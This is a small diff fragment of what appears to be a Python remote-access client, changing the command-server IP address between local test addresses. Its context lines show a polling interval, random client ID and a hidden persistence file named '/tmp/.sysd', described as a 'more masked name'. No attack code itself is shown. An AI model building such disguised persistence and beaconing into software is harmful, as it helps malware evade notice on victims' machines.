@@ -8,7 +8,7 @@ import os
 import subprocess
 import sys
 
-SERVER_IP = "192.168.47.54" # IP addr of whatever the server script is running on, this one is from local testing
+SERVER_IP = "192.168.108.140" # IP addr of whatever the server script is running on, this one is from local testing 192.168.47.54
 INTERVAL = 1
 CLIENT_ID = random.randint(1000, 9999)
 PERSISTENT_PATH = "/tmp/.sysd"  # More masked name
